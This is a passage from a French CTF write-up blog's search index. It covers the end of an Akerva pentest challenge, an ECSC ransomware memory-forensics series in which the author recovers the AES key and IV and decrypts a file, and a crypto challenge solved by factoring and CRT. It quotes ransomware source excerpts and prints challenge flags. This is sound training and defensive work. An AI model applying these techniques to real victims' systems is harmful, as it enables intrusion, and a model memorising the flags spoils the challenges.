plus rapide reste de copier l’ensemble des fichiers du dossier VIP sur KaliVM : (KaliVM) ➜ scp -r -i ../id_rsa_root root@172.16.69.65:/tmp/a/DATA/VIP/ . INVOICE.pdf 100% 125KB 1.9MB/s 00:00 flag_lol.jpg 100% 86KB 2.6MB/s 00:00 INVOICE.docx 100% 30KB 1.9MB/s 00:00 whiteboard.jpg 100% 149KB 3.1MB/s 00:00 (KaliVM) ➜ exiftool * | grep -i 'author' Author : Grandma Josephine Le flag final est le SHA256 de “Grandma Josephine”. ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:14:6","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"XIII.6. Flag b8a3ef108d0c3fac75f3f99f4d6465db8b85b29f41edcfb419a986ca861239f9 ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:14:7","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"Resources Bima Fajar Ramadhan, ProxyChains Tutorial, linuxhint : https://linuxhint.com/proxychains-tutorial/ Equipe de developpez, NFS : le partage de fichiers sous Unix, developpez.com : https://linux.developpez.com/formation_debian/nfs.html ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:14:8","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"Conclusion Pour conclure, le WonkaChallenge d’Akerva m’a permis de travailler sur des technologies à jour, et ça a été vraiment agréable. La difficulté globale du challenge a bien été dosée, malgré les différentes catégories parcourues. D’un point de vue plus personnel, j’ai appris plusieurs choses : interagir avec des bucket s3, déployer une application via host-manager pour exploiter un serveur tomcat, le resource based constrained delegation pour impersonate un utilisateur sur l’active directory et enfin le ret2plt. Enfin, l’infrastructure du challenge a très bien résisté à l’assaut de plusieurs dizaines (centaines ?) de challengers. C’était agréable de pouvoir travailler sur le challenge sans bugs ou autres problèmes de stabilité. Seule l’utilisation du psexec juste après l’exploitation du rbcd a été un peu chaotique. Pour clore ce writeup, je souhaite remercier l’équipe d’Akerva en charge du challenge. C’était de belles épreuves, et j’ai hâte de jouer le Wonka3 l’année prochaine ! ","date":"2019-07-20","objectID":"maki.bzh/writeups/wonkachall2019/:15:0","tags":["akeva","active directory","pentest","mimikatz","pwn","pentest","cme","web"],"title":"[Akerva] - WonkaChallenge","uri":"maki.bzh/writeups/wonkachall2019/"},{"categories":["Writeups"],"content":"Simple reverse shell using OpenSSL.","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"3615 incident (1) ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/:0:0","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"Description Une victime de plus tombée sous le coup d’un rançongiciel. Le paiement de la rançon n’est pas envisagée vu le montant demandé. Vous êtes appelé pour essayer de restaurer les fichiers chiffrés. Une suite d’éléments est nécessaire pour avancer dans l’investigation et constituer le rapport d’incident. Pour commencer, quel est le nom du fichier exécutable de ce rançongiciel, son identifiant de processus et quel est devenu le nom du fichier flag.docx une fois chiffré ? Donnez le SHA1 de ce nom avec son extension. Note : l’image disque fait environ 440 Mo compressée et environ 1.4 Go décompressée. Réponse attendue au format ECSC{nom_du_rançongiciel.exe:PiD:sha1}. ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/:1:0","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"Nom \u0026 PID du rançongiciel On sait que le fichier flag.docx existe et a été chiffré par le ransomware, voyons ce qu’un simple yarascan nous donne : root@2767878b4519:/opt# vol.py -f usr_land/mem.dmp --profile=Win10x64_10586 yarascan -Y \"flag.docx\" Volatility Foundation Volatility Framework 2.6.1 Rule: r1 Owner: Process assistance.exe Pid 5208 0x1280a472 66 6c 61 67 2e 64 6f 63 78 00 6a 73 00 00 43 3a flag.docx.js..C: 0x1280a482 5c 55 73 65 72 73 5c 54 4e 4b 4c 53 41 49 33 54 \\Users\\TNKLSAI3T 0x1280a492 47 54 37 4f 39 5c 44 6f 63 75 6d 65 6e 74 73 5c GT7O9\\Documents\\ 0x1280a4a2 66 6c 61 67 2e 64 6f 63 78 00 2e 69 6e 69 43 3a flag.docx..iniC: 0x1280a4b2 5c 55 73 65 72 73 5c 54 4e 4b 4c 53 41 49 33 54 \\Users\\TNKLSAI3T 0x1280a4c2 47 54 37 4f 39 5c 4c 69 6e 6b 73 5c 5a 47 56 7a GT7O9\\Links\\ZGVz 0x1280a4d2 61 33 52 76 63 43 35 70 62 6d 6b 3d 00 00 43 3a a3RvcC5pbmk=..C: 0x1280a4e2 5c 55 73 65 72 73 5c 54 4e 4b 4c 53 41 49 33 54 \\Users\\TNKLSAI3T 0x1280a4f2 47 54 37 4f 39 5c 4c 69 6e 6b 73 5c 5a 47 56 7a GT7O9\\Links\\ZGVz 0x1280a502 61 33 52 76 63 43 35 70 62 6d 6b 3d 6a 73 43 3a a3RvcC5pbmk=jsC: 0x1280a512 5c 55 73 65 72 73 5c 54 4e 4b 4c 53 41 49 33 54 \\Users\\TNKLSAI3T 0x1280a522 47 54 37 4f 39 5c 4c 69 6e 6b 73 5c 64 65 73 6b GT7O9\\Links\\desk 0x1280a532 74 6f 70 2e 69 6e 69 00 6f 70 2e 69 6e 69 43 3a top.ini.op.iniC: 0x1280a542 5c 55 73 65 72 73 5c 54 4e 4b 4c 53 41 49 33 54 \\Users\\TNKLSAI3T 0x1280a552 47 54 37 4f 39 5c 4c 69 6e 6b 73 5c 64 65 73 6b GT7O9\\Links\\desk 0x1280a562 74 6f 70 2e 69 6e 69 00 00 00 00 00 00 00 43 3a top.ini.......C: [...] Un seul process en ressort : assistance.exe, qui a le PID 5208. Pour voir si ce binaire est malveillant, quoi de mieux qu’un benchmark d’antivirus: root@2767878b4519:/opt# vol.py -f usr_land/mem.dmp --profile=Win10x64_10586 procdump -p 5208 -D usr_land/wu/ Volatility Foundation Volatility Framework 2.6.1 Process(V) ImageBase Name Result ------------------ ------------------ -------------------- ------ 0xffffe000106bb840 0x0000000000400000 assistance.exe OK: executable.5208.exe Fig 3: Résultats virustotal Un autre indice pourrait être l’emplacement de l’executable : root@2767878b4519:/opt# vol.py -f usr_land/mem.dmp --profile=Win10x64_10586 filescan \u003e usr_land/wu/pfilescan Volatility Foundation Volatility Framework 2.6.1 root@2767878b4519:/opt# cat usr_land/wu/pfilescan | grep 'assistance.exe' 0x0000e00011360090 1 0 R--r-d \\Device\\HarddiskVolume3\\Users\\TNKLSAI3TGT7O9\\Downloads\\assistance.exe 0x0000e00011483b40 10 0 R--r-d \\Device\\HarddiskVolume3\\Users\\TNKLSAI3TGT7O9\\Downloads\\assistance.exe 0x0000e000121df450 6 0 R--r-d \\Device\\HarddiskVolume3\\Users\\TNKLSAI3TGT7O9\\Downloads\\assistance.exe 0x0000e0001256bde0 14 0 R--r-d \\Device\\Mup\\;Z:000000000002acd3\\vmware-host\\Shared Folders\\e\\assistance.exe Donc, on va dire que Michel a juste téléchargé le binaire et pas que quelqu’un l’a drop volontairement via un dossier partagé :D ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/:2:0","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"Nom de flag.docx chiffré Restons dans les fichiers chargés en mémoire, voyons rapidement ce qu’il y a dedans : 0x0000e00010323f20 32768 1 R--rwd \\Device\\HarddiskVolume3\\Users\\TNKLSAI3TGT7O9\\Downloads 0x0000e000109d5090 32768 1 R--rwd \\Device\\HarddiskVolume3\\Users\\TNKLSAI3TGT7O9\\Downloads 0x0000e00011360090 1 0 R--r-d \\Device\\HarddiskVolume3\\Users\\TNKLSAI3TGT7O9\\Downloads\\assistance.exe 0x0000e00011483b40 10 0 R--r-d \\Device\\HarddiskVolume3\\Users\\TNKLSAI3TGT7O9\\Downloads\\assistance.exe 0x0000e00011e15f20 32768 1 R--rw- \\Device\\HarddiskVolume3\\Users\\TNKLSAI3TGT7O9\\Downloads 0x0000e000121df450 6 0 R--r-d \\Device\\HarddiskVolume3\\Users\\TNKLSAI3TGT7O9\\Downloads\\assistance.exe 0x0000e000126f1650 16 0 RW-rw- \\Device\\HarddiskVolume3\\Users\\Administrateur\\Downloads\\ZGVza3RvcC5pbmk=.chiffré Forcément, le fichier qui saute au visage est ZGVza3RvcC5pbmk=.chiffré. Voyons ce que le base64 signifie: root@2767878b4519:/opt# echo 'ZGVza3RvcC5pbmk=' | base64 -d desktop.ini Intuitivement, je suppose que le nom des fichiers chiffrés est encodé en base64 et sont suivis de la charmante mention chiffré. Vérifions cette hypothèse : desktop.iniroot@2767878b4519:/opt# echo -n 'flag.docx' | base64 ZmxhZy5kb2N4 root@2767878b4519:/opt# cat usr_land/wu/pfilescan | grep 'ZmxhZy5kb2N4' 0x0000e000123988d0 16 0 R--r-d \\Device\\HarddiskVolume4\\ZmxhZy5kb2N4.chiffré ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/:3:0","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"Flag ECSC{assistance.exe:5208:c9a12b109a58361ff1381fceccdcdcade3ec595a} 3615 incident (2) ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/:4:0","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"Description Une victime de plus tombée sous le coup d’un rançongiciel. Le paiement de la rançon n’est pas envisagée vu le montant demandé. Vous êtes appelé pour essayer de restaurer les fichiers chiffrés. Une suite d’éléments est nécessaire pour avancer dans l’investigation et constituer le rapport d’incident. Retrouvez la clé de chiffrement de ce rançongiciel! Note : l’image disque fait environ 440 Mo compressée et environ 1.4 Go décompressée. Elle est identique au challenge 3615 Incident - 1. Réponse attendue au format ECSC{clé}. ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/:5:0","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"Etat de l’art Bon, pour trouver la clé d’un ransomware, soit c’est hardcodé dans le binaire, soit il va falloir tailler dans le vif de la mémoire. On a déjà récupéré le binaire, récupérons la mémoire de ce process. En naviguant rapidement dans le binaire, on peut voir un repo GitHub : ➜ wu strings executable.5208.exe | grep github github.com/mattn/go-colorable %github.com/mauri870/ransomware/client github.com/mauri870/ransomware/cryptofs github.com/mauri870/ransomware/build/ransomware github.com/mauri870/ransomware github.com/fatih/color github.com/mattn/go-colorable github.com/mattn/go-isatty https://github.com/mauri870/ransomware/ Un super ransomware en Go. Donc à partir de là, je sais que le reverse n’est pas une option. ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/:6:0","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"Structure de la clé - Part 1 Dans les sources du ransomware on peut voir une structure entre un identifiant et une clé. https://github.com/mauri870/ransomware/blob/master/cmd/ransomware/ransomware.go func encryptFiles() { keys := make(map[string]string) [...] for { [...] // Generate the id and encryption key keys[\"id\"], _ = utils.GenerateRandomANString(32) keys[\"enckey\"], _ = utils.GenerateRandomANString(32) // Persist the key pair on server res, err := Client.AddNewKeyPair(keys[\"id\"], keys[\"enckey\"]) [...] https://github.com/mauri870/ransomware/blob/master/utils/utils.go // Generate a random alphanumeric string with the given size func GenerateRandomANString(size int) (string, error) { key := make([]byte, size) _, err := rand.Read(key) if err != nil { return \"\", err } return hex.EncodeToString(key)[:size], nil } Il est plutôt clair que la clé et l’identifiant vont former une chaîne de 16 octets, mais en voici la preuve : https://play.golang.org/ package main import ( \"crypto/rand\" \"encoding/hex\" \"fmt\" ) func GenerateRandomANString(size int) (string, error) { key := make([]byte, size) _, err := rand.Read(key) if err != nil { return \"\", err } return hex.EncodeToString(key)[:size], nil } func main() { for i := 0; i \u003c 10; i++ { fmt.Println(GenerateRandomANString(32)) } } Output : d6e8aec1a39e2322635dd41a8fd24cf2 \u003cnil\u003e 1100c622a07382ac8588fe0904cb987d \u003cnil\u003e 1490d561257900bbf1c91543e69c0530 \u003cnil\u003e eebc86cfaf014b7b0258931b3e67870e \u003cnil\u003e 26e938c4f18ad7d93d0bc6cc47eccbb9 \u003cnil\u003e dd712f6f01da3ed26fdf2a4bab19729c \u003cnil\u003e 6cf81a92b9baa84af784edb73629714e \u003cnil\u003e 2487a4aeab8cbc07b6f8ebe866e36ed9 \u003cnil\u003e 43054bf6afbbe00950dd388458e16e71 \u003cnil\u003e 83ce9f50f2c686873d0a05b4418696c8 \u003cnil\u003e ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/:7:0","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"Structure de la clé - Part 2 On sait quelle forme a la donnée que l’on cherche et on sait plus ou moins où elle se trouve. Mais regardons si cette structure id / enckey en JSON est présente en mémoire : ➜ wu strings 5208.dmp| grep -C 5 \"enckey\" [/LL 95511870061fb3a2899aa6b2dc9838aa \"C:\\Users\\TNKLSAI3TGT7O9\\Downloads\\assistance.exe\" C:\\Users\\TNKLSAI3TGT7O9\\Downloads\\assistance.exe S-1-5-21-2377780471-3200203716-3353778491-1000 {\"id\": \"cd18c00bb476764220d05121867d62de\", \"enckey\": \" cd18c00bb476764220d05121867d62de64e0821c53c7d161099be2188b6cac24cd18c00bb476764220d05121867d62de64e0821c53c7d161099be2188b6cac2495511870061fb3a2899aa6b2dc9838aa422d81e7e1c2aa46aa51405c13fed15b95511870061fb3a2899aa6b2dc9838aa422d81e7e1c2aa46aa51405c13fed15b Encrypting C:\\Users\\Administrateur\\Contacts\\desktop.ini... C:\\Users\\TNKLSA~1\\AppData\\Local\\Temp\\desktop.ini C:\\Users\\TNKLSA~1\\AppData\\Local\\Temp\\desktop.ini Encrypting C:\\Users\\Administrateur\\Documents\\desktop.ini... On a quelque chose qui ressemble à la clé juste au-dessus de la structure. Pour nous conforter dans cette idée, regardons le pâté d’hex juste à la suite de enckey: cd18c00bb476764220d05121867d62de 64e0821c53c7d161099be2188b6cac24 cd18c00bb476764220d05121867d62de 64e0821c53c7d161099be2188b6cac24 95511870061fb3a2899aa6b2dc9838aa 422d81e7e1c2aa46aa51405c13fed15b 95511870061fb3a2899aa6b2dc9838aa 422d81e7e1c2aa46aa51405c13fed15b Pour éviter de bruteforcer comme un âne, on peut essayer de voir s’il y a d’autres chaînes pouvant être de bons candidats : ➜ wu strings 5208.dmp| grep -E '^[a-f0-9]{32}$' | grep -v -E '[0-9]{32}' | sort | uniq 15590781f1602a3ba9982b6a89cdaa83 51e07da907d2e5118729806e6f6e6963 5476d0c4a7a347909c4b8a13078d4390 857bf9aba3e92444aed7cab9ad2342ea 95511870061fb3a2899aa6b2dc9838aa 965b7fc26dad90d340d2fa0a4879039f cd18c00bb476764220d05121867d62de Il y a deux chaînes communes à nos paquets d’octets : cd18c00bb476764220d05121867d62de : Identifiants 95511870061fb3a2899aa6b2dc9838aa : Clé ??? C’est effectivement la clé de chiffrement. ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/:8:0","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"Flag ECSC{95511870061fb3a2899aa6b2dc9838aa} 3615 incident (3) ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/:9:0","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"Description Une victime de plus tombée sous le coup d’un rançongiciel. Le paiement de la rançon n’est pas envisagée vu le montant demandé. Vous êtes appelé pour essayer de restaurer les fichiers chiffrés. Déchiffrez le fichier “flag.docx” ci-joint! ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/:10:0","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"Etat de l’art Dans ce dernier challenge de la série 3615 incident, le fichier chiffré nous a été donné. On sait qu’on cherche un docx, donc une signature de ZIP : 50 4B 03 04. On sait aussi que le fichier a été chiffré avec de l’AES CTR, donc nous avons la clé, mais il manque l’IV. ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/:11:0","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"A la recherche de l’IV perdu https://github.com/mauri870/ransomware/blob/master/cryptofs/file.go [...] func (file *File) Encrypt(enckey string, dst io.Writer) error { [...] // The IV needs to be unique, but not secure iv := make([]byte, aes.BlockSize) if _, err = io.ReadFull(rand.Reader, iv); err != nil { return err } // Get a stream for encrypt/decrypt in counter mode (best performance I guess) stream := cipher.NewCTR(block, iv) // Write the Initialization Vector (iv) as the first block // of the dst writer dst.Write(iv) [...] L’IV est donc le premier bloc du fichier chiffré. Le voici : ➜ wu cat data | head -c 16 | xxd -p b627d24fc90dfe7ce421c43312dc2f2e Maintenant, soit on faire un super script python, soit on utilise CyberChef. Il est 5h53 du matin, je vais utiliser CyberChef: https://gchq.github.io/CyberChef/ Pour récupérer le fichier chiffré sans le premier bloc : ➜ wu cat data | xxd -p | tail -c+33 | tr -d ' \\n' Ce qui nous donne : Fig 4: Déchiffrement du fichier dans CyberChef La signature du début ressemble à un ZIP et la structure qui suit avec le _rels/.rels et le docProps font penser à un DOCX. Fig 5: Fichier déchiffré ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/:12:0","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"Flag ECSC{M4ud1t3_C4mp4gn3_2_r4NC0nG1c13L} ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench20193615incident/:13:0","tags":["anssi","ecsc","forensic","malware","memory dump","volatility"],"title":"[ECSC] - 3615 incident","uri":"maki.bzh/writeups/ecscfrench20193615incident/"},{"categories":["Writeups"],"content":"Description Dumby possède un secret qui en fait une personne exceptionnelle, en tout cas c’est ce qu’il dit. Dumb, un ami de Dumby, a échangé avec lui sur le sujet et n’a pas réussi à révéler ce mystère. Il vous confie une archive de cette conversation et compte sur vous pour résoudre l’énigme, surtout qu’il vient d’effacer la clé USB qui contenait ses clés secrètes et les fichiers déchiffrés, il porte bien son nom celui-là… ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019cryptodiy/:1:0","tags":["anssi","ecsc","crypto","chinese remainder theorem"],"title":"[ECSC] - CryptoDIY","uri":"maki.bzh/writeups/ecscfrench2019cryptodiy/"},{"categories":["Writeups"],"content":"Mail On commence cette épreuve avec un dump de boit gmail. Dedans on retrouve un échange entre deux personnes parlant d’un super algo de crypto de la mort qui tue et un fichier chiffré. Et on retrouve le script implémentant cet algo: #Public keys N=53631231719770388398296099992823384509917463282369573510894245774887056120440201731735752915096736722856082884548917654078388282501542293219713052500317361 #N=p*q with primes p and q that are part of my secret key g1=27888419610931008932601664194635863362934795268815711191831564335481311281875775885782976960387128801701810764586184606874328259752328953489610371824189861 #g1=g^(r1*(p-1)) mod N where r1 is a secret random g2=48099264739307394087061906063506998841178675587231635606136922987485103900358857801144199074460106065443613588490877251721439499846448566220473205526148817 #g2=g^(r2*(q-1)) mod N where r2 is a secret random #To encipher the message m of same size as N #Choose two nounces s1 and s2 (plz keep them secret) and send me c1 and c2 given by: import random def encipher(m,g1,g2,N): s1 = random.randrange(2**127,2**128) s2 = random.randrange(2**127,2**128) return (m*pow(g1,s1,N))%N, (m*pow(g2,s2,N))%N #To encipher a data use this code and send me the cipher file nb_car_block=64 def BlobToIntSeq(m,nb_car_block): m = m + bytes([71,82,114]) l = len(m) r = l % nb_car_block if not(r == 0): m = m + (nb_car_block-r)*bytes([114]) l = len(m) out = [] i = 0 j = nb_car_block while j\u003c=l: tmp = int.from_bytes(m[i:j], \"big\") out = out + [tmp] i,j = i+nb_car_block,j+nb_car_block return out import sys plainbin = open(sys.argv[1], 'rb') plain = plainbin.read() plainbin.close() l = len(plain) plainint = BlobToIntSeq(plain,nb_car_block) cipher = open(sys.argv[1]+'.cipher', 'w') i = 0 for m in plainint: c1,c2=encipher(m,g1,g2,N) cipher.write((str(c1)) + '\\n') cipher.write((str(c2)) + '\\n') i=i+1 cipher.close() Avant de commencer à attaquer le vif du sujet, il y a de mentions intéressantes dans les mails : “in particular factorizzation of the modulus” “the asiatic theorem… I do not remember the exact name” Enfin, on sait que l’on cherche un fichier MP4, qui a la signature suivante : Maintenant, on sait pour où commencer et ce qu’on cherche. ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019cryptodiy/:2:0","tags":["anssi","ecsc","crypto","chinese remainder theorem"],"title":"[ECSC] - CryptoDIY","uri":"maki.bzh/writeups/ecscfrench2019cryptodiy/"},{"categories":["Writeups"],"content":"Factorisation On a un gros N, donc essayons de le factoriser. D’habitude factordb fonctionne bien, mais dans ce cas précis pas du tout, je me suis rabattu sur : https://www.alpertron.com.ar/ECM.HTM Nous avons donc: p = 115792089237316195423570985008687907853269984665640564039457584007913129640233 q = 463168356949264781694283940034751631413079938662562256157830336031652518559817 ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019cryptodiy/:3:0","tags":["anssi","ecsc","crypto","chinese remainder theorem"],"title":"[ECSC] - CryptoDIY","uri":"maki.bzh/writeups/ecscfrench2019cryptodiy/"},{"categories":["Writeups"],"content":"“Simplification” Les équations qui nous intéressent sont : g1=g^(r1*(p-1)) mod N g2=g^(r2*(q-1)) mod N Au début le fait de ne pas avoir g m’a perturbé et je comprennais pas comment faire. Alors je me suis mis à jouer avec les modulo p et q. Et quelques chose de rigolo arriva: \u003e\u003e\u003e import random \u003e\u003e\u003e g1=27888419610931008932601664194635863362934795268815711191831564335481311281875775885782976960387128801701810764586184606874328259752328953489610371824189861 #g1=g^(r1*(p-1)) mod N where r1 is a secret random \u003e\u003e\u003e g2=48099264739307394087061906063506998841178675587231635606136922987485103900358857801144199074460106065443613588490877251721439499846448566220473205526148817 #g2=g^(r2*(q-1)) mod N where r2 is a secret random \u003e\u003e\u003e N=53631231719770388398296099992823384509917463282369573510894245774887056120440201731735752915096736722856082884548917654078388282501542293219713052500317361 #N=p*q with primes p and q that are part of my secret key \u003e\u003e\u003e p = 115792089237316195423570985008687907853269984665640564039457584007913129640233 \u003e\u003e\u003e q = 463168356949264781694283940034751631413079938662562256157830336031652518559817 \u003e\u003e\u003e m = p+5000000000000000000000000000000000000000000000000000 # Pour prendre un m bien plus grand que p \u003e\u003e\u003e def encipher(m,g1,g2,N): ... s1 = random.randrange(2**127,2**128) ... s2 = random.randrange(2**127,2**128) ... return (m*pow(g1,s1,N))%N, (m*pow(g2,s2,N))%N # m x ... \u003e\u003e\u003e i,j = encipher(m,g1,g2,N) \u003e\u003e\u003e j%q 115792089237316195423570990008687907853269984665640564039457584007913129640233L \u003e\u003e\u003e m%q 115792089237316195423570990008687907853269984665640564039457584007913129640233L \u003e\u003e\u003e i%p 5000000000000000000000000000000000000000000000000000L \u003e\u003e\u003e m%p 5000000000000000000000000000000000000000000000000000L On peut donc appliquer le CRT. Lors du challenge j’ai fuzzé pour trouver ces résultats. Cependant, avec un peu de recherche, je suis tombé sur le petit théroème de Fermat, qui explique cette propriété : http://villemin.gerard.free.fr/ThNbDemo/PtThFerm.htm ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019cryptodiy/:4:0","tags":["anssi","ecsc","crypto","chinese remainder theorem"],"title":"[ECSC] - CryptoDIY","uri":"maki.bzh/writeups/ecscfrench2019cryptodiy/"},{"categories":["Writeups"],"content":"Chinese Remainder Theorem On cherche m%n avec n = p*q, grace à la simplification précédente on connait m = i%p et m = j%q. Comme je suis une buse en math et une buse en prog, mais que je suis en bon en recherche Google, je suis tombé sur ce site : https://www.geeksforgeeks.org/using-chinese-remainder-theorem-combine-modular-equations/ Ce site explique ce qu’est le CRT et propose une implémentation en python. Et enfin quelques chose de prometteur : \u003e\u003e\u003e p = 115792089237316195423570985008687907853269984665640564039457584007913129640233 \u003e\u003e\u003e q = 463168356949264781694283940034751631413079938662562256157830336031652518559817 \u003e\u003e\u003e j = 0 \u003e\u003e\u003e k = 1 \u003e\u003e\u003e \u003e\u003e\u003e f = open('/Users/maki/Documents/ctf/ecsc/cryptodiy/Takeout/Mail/WIM.mp4.cipher','r') \u003e\u003e\u003e data = f.read().split('\\n') \u003e\u003e\u003e f.close() \u003e\u003e\u003e def extended_euclidean(a, b): ... if a == 0: ... return (b, 0, 1) ... else: ... g, y, x = extended_euclidean(b % a, a) ... return (g, x - (b // a) * y, y) ... \u003e\u003e\u003e def modinv(a, m): ... g, x, y = extended_euclidean(a, m) ... return x % m ... \u003e\u003e\u003e def crt(m, x): ... while True: ... temp1 = modinv(m[1],m[0]) * x[0] * m[1] + modinv(m[0],m[1]) * x[1] * m[0] ... temp2 = m[0] * m[1] ... x.remove(x[0]) ... x.remove(x[0]) ... x = [temp1 % temp2] + x ... m.remove(m[0]) ... m.remove(m[0]) ... m = [temp2] + m ... if len(x) == 1: ... break ... return x[0] ... \u003e\u003e\u003e m = [p,q] \u003e\u003e\u003e x = [int(data[0])%p, int(data[1])%q] \u003e\u003e\u003e tmp = crt(m,x) \u003e\u003e\u003e hex(tmp) '0x1c667479706d703432000000016d7034316d70343269736f6d00016a8b6d6f6f760000006c6d76686400000000d8f7caa8d8f88d90000003e800009745L' \u003e\u003e\u003e hex(tmp)[2:-1].decode('hex') '\\x1cftypmp42\\x00\\x00\\x00\\x01mp41mp42isom\\x00\\x01j\\x8bmoov\\x00\\x00\\x00lmvhd\\x00\\x00\\x00\\x00\\xd8\\xf7\\xca\\xa8\\xd8\\xf8\\x8d\\x90\\x00\\x00\\x03\\xe8\\x00\\x00\\x97E' La signature d’un MP4 ! Maintenant il faut jouer un peu avec la donnée. On remarque qu’il manque des 00 au début du fichier. Il faut donc padder avec des 00 les blocs faisant une taille inférieure à 64. ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019cryptodiy/:5:0","tags":["anssi","ecsc","crypto","chinese remainder theorem"],"title":"[ECSC] - CryptoDIY","uri":"maki.bzh/writeups/ecscfrench2019cryptodiy/"},{"categories":["Writeups"],"content":"Scripting time #!/usr/bin/python2 # Factor N : https://www.alpertron.com.ar/ECM.HTM p = 115792089237316195423570985008687907853269984665640564039457584007913129640233 q = 463168356949264781694283940034751631413079938662562256157830336031652518559817 j = 0 k = 1 f = open('/Users/maki/Documents/ctf/ecsc/cryptodiy/Takeout/Mail/WIM.mp4.cipher','r') data = f.read().split('\\n') f.close() # function that implements Extended euclidean # algorithm def extended_euclidean(a, b): if a == 0: return (b, 0, 1) else: g, y, x = extended_euclidean(b % a, a) return (g, x - (b // a) * y, y) # modular inverse driver function def modinv(a, m): g, x, y = extended_euclidean(a, m) return x % m # function implementing Chinese remainder theorem # list m contains all the modulii # list x contains the remainders of the equations def crt(m, x): while True: temp1 = modinv(m[1],m[0]) * x[0] * m[1] + modinv(m[0],m[1]) * x[1] * m[0] temp2 = m[0] * m[1] x.remove(x[0]) x.remove(x[0]) x = [temp1 % temp2] + x m.remove(m[0]) m.remove(m[0]) m = [temp2] + m if len(x) == 1: break return x[0] g = open('clear_dat','wb+') for i in range(0, len(data)): x = [int(data[j])%p, int(data[k])%q] j = j+2 k = k+2 m = [p,q] tmp_var = crt(m,x) tmp_var = hex(tmp_var).lstrip('0x').rstrip('L') if len(tmp_var)%2 == 0: pass else: tmp_var = '0'+tmp_var dec = tmp_var.decode(\"hex\").rjust(64,'\\x00') g.write(dec) g.close() ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019cryptodiy/:6:0","tags":["anssi","ecsc","crypto","chinese remainder theorem"],"title":"[ECSC] - CryptoDIY","uri":"maki.bzh/writeups/ecscfrench2019cryptodiy/"},{"categories":["Writeups"],"content":"SHAZAAAAAAAAM Nous voilà avec une vidéo… De K-pop… M’enfin, regardons les exifs: ➜ cryptodiy exiftool clear_dat [...] Handler 